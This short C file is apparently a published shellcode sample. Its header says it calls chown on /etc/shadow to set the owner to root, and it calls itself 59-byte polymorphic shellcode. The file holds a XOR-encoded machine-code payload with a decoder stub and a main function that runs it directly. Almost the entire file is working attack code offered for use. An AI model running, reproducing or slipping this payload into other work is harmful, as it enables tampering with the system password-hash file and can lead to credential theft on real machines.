/*
 * sys_chown("/etc/shadow", 0, 0);
 * [*] param_1 = "/etc/shadow" ---> file_path
 * [*] param_2 = 0 ---> active uid
 * [*] param_3 = 0 ---> active gid
 *
 * 59 bytes polymorphic shellcode
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

#include <stdio.h>
#include <string.h>

char chown_encoded[] = "\xeb\x0d\x5e\x31\xc9\xb1\x27\x80\x36\xa6"
                       "\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
                       "\x97\x66\x25\x4a\xa7\x2e\xa2\x82\xce\xc7"
                       "\xc2\xc9\xd1\xce\xc5\x89\xd5\xce\xce\x89"
                       "\x89\xc3\xd2\x16\x10\x2f\x45\x97\x6f\x97"
                       "\x74\x6b\x26\x97\x66\x16\xa7\x6b\x26";

int main(void) {
  int chown_len = strlen(chown_encoded);
  printf("[+] Using key mutation engine : 0xa6\n");
  printf("[+] Length of this shellcode is : %d bytes\n", chown_len);
  (*(void(*)())chown_encoded)();
  return 0;
}

/* devilzc0de.org, hacker-newbie.org, sdf.lonestar.org, 1337day.com */
